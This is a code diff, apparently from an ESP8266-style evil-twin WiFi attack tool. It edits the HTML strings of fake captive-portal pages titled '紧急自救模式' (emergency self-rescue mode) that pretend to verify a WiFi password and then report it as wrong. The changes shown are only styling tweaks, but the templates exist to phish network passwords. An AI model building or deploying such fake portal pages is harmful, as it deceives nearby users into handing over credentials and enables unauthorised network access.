@@ -68,20 +68,22 @@ String FAKE_BODY = "<body><nav>"+ FAKE_TITLE +"</nav> <div><div>"
                     "</form></div><div class=q><a>&#169; All rights reserved.</a></div></div></body>";
 
 String FAKE_SERVER_VERIFY = "<!DOCTYPE html><html><head><title>紧急自救模式</title>"
-                    "<script> setTimeout(function(){window.location.href = '/result';}, 30000); </script>"
-                    "<style>nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }</style>"
+                    "<script> setTimeout(function(){window.location.href = '/result';}, 30000); </script><style>"
+                    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
+                    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }</style>"
                     "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'></head>"
                     "<body><nav>紧急自救模式</nav><center><h2 style='font-size:4vw'>验证WIFI中, 请稍后...<br>"
                     "<progress value='33' max='100'>33%</progress></h2></center></body></html>";
 
 String FAKE_SERVER_ERROR_PWD = "<!DOCTYPE html><html><head><title>紧急自救模式</title>"
                     "<script> setTimeout(function(){window.location.href = '/result';}, 30000); </script><style>"
+                    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
                     "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }</style>"
                     "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>"
                     "<script> setTimeout(function(){window.location.href = '/';}, 4000); </script>"
                     "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                     "<body><nav>紧急自救模式</nav><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:40px;width:40px;height:40px'>&#8855;</wrong>"
-                    "<br>密码错误</h2></body></html>";
+                    "<br><br>密码错误</h2></body></html>";
 
 String MainServerTemp = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>"
